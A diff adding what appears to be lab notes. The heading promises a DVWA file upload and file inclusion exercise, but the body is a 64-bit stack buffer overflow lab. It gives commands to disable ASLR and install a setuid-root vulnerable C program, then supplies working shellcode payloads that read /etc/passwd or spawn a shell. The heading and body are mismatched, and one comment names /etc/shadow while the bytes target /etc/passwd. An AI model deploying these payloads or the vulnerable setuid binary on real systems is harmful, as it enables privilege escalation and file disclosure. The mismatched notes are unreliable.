@@ -1,0 +1,98 @@
+Getting familiar with File Upload and File Inclusion (RFI & LFI ) Web Application Vulnerabilities.
+
+- Demonstrate attack using file upload and file inclusion vulnerabilities on DVWA.
+
+- Report the analysis with countermeasures.
+
+
+
+//diable ASLR
+
+// echo "0" > /proc/sys/kernel/randomize_va_space
+
+// gcc SH3.c -o SH3 -fno-stack-protector -z execstack
+
+// chown root:root SH3 chmod u+s SH3
+
+// https://dl.packetstormsecurity.net/papers/attack/64bit-overflow.pdf
+
+#include <stdio.h> 
+
+#include <stdlib.h>
+
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+char buffer[256];
+
+if(argc != 2) {
+
+exit(0);
+
+}
+
+printf("%p\n", buffer);
+
+strcpy(buffer, argv[1]);
+
+//printf("%s\n", buffer);
+
+return 0;
+
+}
+
+//264 buffer size
+
+
+
+/* for etc/shadow 82 bytes (264-82 = 182 A)
+
+run $(python -c 'print"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"+ "A" * 182 + "\xb0\xe2\xff\xff\xff\x7f"')
+
+*/
+
+/* for shell 30 bytes (264-30= 234 A)
+
+run $(python -c 'print"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"+"A"*234+"\xb0\xe2\xff\xff\xff\x7f"')
+
+*/
+
+
+
+
+
+
+
+*************************
+
+// Solution works provided ... You change the return address as per your machine (Tested on Ubuntu 20.04.6 LTS) and the buffer size is same.
+
+
+
+#include <stdio.h> 
+
+#include <stdlib.h>
+
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+char buffer[256];
+
+if(argc != 2) {
+
+exit(0);
+
+}
+
+printf("%p\n", buffer);
+
+strcpy(buffer, argv[1]);
+
+//printf("%s\n", buffer);
+
+return 0;
+
+}
+
